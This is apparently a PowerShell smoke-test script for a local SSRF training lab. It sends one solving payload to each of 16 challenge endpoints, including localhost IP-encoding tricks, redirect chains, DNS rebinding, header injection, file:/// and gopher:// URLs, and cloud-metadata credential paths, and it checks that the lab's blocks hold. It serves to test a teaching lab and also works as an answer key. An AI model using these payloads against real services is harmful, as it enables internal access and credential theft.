$ErrorActionPreference = 'Stop'

$base = 'http://127.0.0.1:8080'

try {
    $bootstrap = Invoke-RestMethod -Uri "$base/api/bootstrap" -TimeoutSec 3
} catch {
    throw 'The lab is not running. Start it with .\start.ps1 first.'
}

if ($bootstrap.challenges.Count -ne 16) {
    throw "Expected 16 challenges, found $($bootstrap.challenges.Count)."
}

foreach ($challenge in $bootstrap.challenges) {
    if (-not $challenge.business.api -or -not $challenge.business.param -or -not $challenge.business.method) {
        throw "Challenge $($challenge.id) does not expose real business endpoint metadata."
    }
    foreach ($field in @('successFlag', 'snippet', 'codeLabel', 'target')) {
        if ($challenge.PSObject.Properties.Name -contains $field) {
            throw "Challenge $($challenge.id) exposes $field through bootstrap."
        }
    }
}

$level11 = $bootstrap.challenges | Where-Object { $_.id -eq 11 }
if ($level11.business.header -ne 'X-Forwarded-Host') {
    throw 'Level 11 does not expose the X-Forwarded-Host header contract.'
}

$secretPath = Join-Path (Split-Path -Parent $PSScriptRoot) 'secrets\level6.txt'
$level6Target = 'file:///' + ($secretPath -replace '\\', '/')
$wrongFileUrl = 'file:///C:/Windows/win.ini'

$cases = @(
    @{ level = 1; route = '/products/import-image'; param = 'image_url'; value = 'http://10.220.2.6:8080/'; requiresTarget = $true },
    @{ level = 2; route = '/merchants/import-logo'; param = 'logo_url'; value = 'http://2130706433:8081/admin' },
    @{ level = 3; route = '/campaigns/check-asset'; param = 'asset_url'; value = 'http://127.0.0.1:8081/internal/debug?source=shop.local' },
    @{ level = 4; route = '/messages/link-preview'; param = 'preview_url'; value = 'http://127.0.0.1:8083/redirect?to=http%3A%2F%2F127.0.0.1%3A8081%2Fadmin' },
    @{ level = 5; route = '/profiles/avatar-preview'; param = 'avatar_url'; value = 'http://avatar-7f3a.cdn-preview.ssrf.lab:8082/latest/meta-data/iam/security-credentials/lab-role' },
    @{ level = 6; route = '/knowledge-base/preview-attachment'; param = 'attachment_url'; value = $level6Target },
    @{ level = 7; route = '/profiles/sync-avatar'; param = 'avatar_url'; value = 'http://shop.local@127.0.0.1:8081/internal/parser' },
    @{ level = 8; route = '/admin/assets/migrate'; param = 'asset_url'; value = 'http://0177.0.0.1:8081/internal/encoding' },
    @{ level = 9; route = '/partners/media-sync'; param = 'media_url'; value = 'http://media-2f9c.dual-cdn.ssrf.lab:8081/internal/dns-mixed' },
    @{ level = 10; route = '/messages/rich-preview'; param = 'preview_url'; value = 'http://127.0.0.1:8083/redirect/chain?to=http%3A%2F%2F127.0.0.1%3A8081%2Fadmin' },
    @{ level = 11; route = '/webhook/test'; param = 'base_url'; value = 'http://127.0.0.1:8080/webhook/test'; headers = @{ 'X-Forwarded-Host' = '127.0.0.1:8081' } },
    @{ level = 12; route = '/reports/export'; param = 'callback_url'; value = 'http://10.220.2.6:8080/index?host=example.com'; requiresTarget = $true },
    @{ level = 13; route = '/marketing/collect-asset'; param = 'resource_url'; value = 'gopher://127.0.0.1:6380/_GET%20flag%0D%0A' },
    @{ level = 14; route = '/cloud/import-asset'; param = 'asset_url'; value = 'http://metadata.google.internal:8082/computeMetadata/v1/instance/service-accounts/default/token' },
    @{ level = 15; route = '/sharing/card'; param = 'page_url'; value = 'http://127.0.0.1:8084/renderer-page?target=http%3A%2F%2F127.0.0.1%3A8081%2Finternal%2Frenderer' },
    @{ level = 16; route = '/feeds/import'; param = 'feed_url'; value = 'http://127.0.0.1:8084/malicious-feed.xml' }
)

function Invoke-LabPost {
    param(
        [string]$Route,
        [hashtable]$Payload,
        [hashtable]$Headers = @{}
    )

    $params = @{
        Uri         = "$base$Route"
        Method      = 'Post'
        ContentType = 'application/json'
        Body        = ($Payload | ConvertTo-Json -Depth 5 -Compress)
        TimeoutSec  = 20
    }
    if ($Headers.Count -gt 0) {
        $params.Headers = $Headers
    }

    return Invoke-RestMethod @params
}

$failed = @()
foreach ($case in $cases) {
    $payload = @{}
    $payload[$case.param] = $case.value
    $headers = @{}
    if ($case.ContainsKey('headers')) {
        $headers = $case.headers
    }

    try {
        $response = Invoke-LabPost -Route $case.route -Payload $payload -Headers $headers
    } catch {
        $failed += "L$($case.level) $($case.route): request failed - $($_.Exception.Message)"
        Write-Host "FAIL  L$($case.level)  $($case.route)" -ForegroundColor Red
        continue
    }

    $targetRequired = $case.ContainsKey('requiresTarget') -and $case.requiresTarget
    if ($response.result.solved -ne $true -and $targetRequired) {
        $targetMessage = [string] $response.result.validation.message
        if ($targetMessage -match '(?i)failed to connect|connection refused|timed out|could not connect') {
            Write-Host "SKIP  L$($case.level)  $($case.route) (target 10.220.2.6:8080 unreachable)"
            continue
        }
    }

    if ($response.result.solved -eq $true) {
        if (-not $response.source.snippet) {
            $failed += "L$($case.level) $($case.route): source missing after solve"
            Write-Host "FAIL  L$($case.level)  $($case.route) (source missing)" -ForegroundColor Red
        } else {
            Write-Host "PASS  L$($case.level)  $($case.route)"
        }
    } else {
        $failed += "L$($case.level) $($case.route): $($response.result.validation.message)"
        Write-Host "FAIL  L$($case.level)  $($case.route)" -ForegroundColor Red
    }
}

# Levels 5 and 9 use a per-request resolver; run each twice to catch leaked state.
foreach ($level in @(5, 9)) {
    $case = $cases | Where-Object { $_.level -eq $level }
    $payload = @{}
    $payload[$case.param] = $case.value
    $first = Invoke-LabPost -Route $case.route -Payload $payload
    $second = Invoke-LabPost -Route $case.route -Payload $payload
    if ($first.result.solved -eq $true -and $second.result.solved -eq $true) {
        Write-Host "PASS  L$($level)  repeated resolver request twice"
    } else {
        $failed += "L$($level) repeat"
        Write-Host "FAIL  L$($level)  repeated resolver request twice" -ForegroundColor Red
    }
}

$boundaryChecks = @(
    @{ label = 'external IP target is blocked'; route = '/products/import-image'; payload = @{ image_url = 'http://192.0.2.10:8082/latest/meta-data' } },
    @{ label = 'non-loopback hostname is blocked'; route = '/products/import-image'; payload = @{ image_url = 'http://example.com:8080/' } },
    @{ label = 'non-lab port is blocked'; route = '/products/import-image'; payload = @{ image_url = 'http://127.0.0.1:9090/' } },
    @{ label = 'rebind host outside level 5 is blocked'; route = '/products/import-image'; payload = @{ image_url = 'http://avatar-7f3a.cdn-preview.ssrf.lab:8082/latest/meta-data' } },
    @{ label = 'gopher port 6379 is blocked'; route = '/marketing/collect-asset'; payload = @{ resource_url = 'gopher://127.0.0.1:6379/_PING' } },
    @{ label = 'file outside level 6 secret is blocked'; route = '/knowledge-base/preview-attachment'; payload = @{ attachment_url = $wrongFileUrl } }
)

foreach ($check in $boundaryChecks) {
    $response = Invoke-LabPost -Route $check.route -Payload $check.payload
    if ($response.result.blocked -eq $true) {
        if ($response.PSObject.Properties.Name -contains 'source') {
            $failed += "Boundary: $($check.label) returned source"
            Write-Host "FAIL  $($check.label) (source leak)" -ForegroundColor Red
        } else {
            Write-Host "PASS  $($check.label)"
        }
    } else {
        $failed += "Boundary: $($check.label)"
        Write-Host "FAIL  $($check.label)" -ForegroundColor Red
    }
}

# /api/probe 已退役。
$probeStatus = 200
try {
    Invoke-WebRequest -Uri "$base/api/probe" -Method Post -ContentType 'application/json' -Body '{"level":1,"url":"http://127.0.0.1:8082/"}' -UseBasicParsing -TimeoutSec 5 | Out-Null
} catch {
    $probeStatus = [int]$_.Exception.Response.StatusCode
}
if ($probeStatus -eq 404) {
    Write-Host 'PASS  retired /api/probe returns 404'
} else {
    $failed += "retired /api/probe returned $probeStatus"
    Write-Host "FAIL  retired /api/probe returns 404 (got $probeStatus)" -ForegroundColor Red
}

if ($failed.Count -gt 0) {
    Write-Host ''
    Write-Host 'Failures:' -ForegroundColor Red
    $failed | ForEach-Object { Write-Host "  $_" -ForegroundColor Red }
    exit 1
}

Write-Host ''
Write-Host 'All SSRF lab smoke tests passed.' -ForegroundColor Green
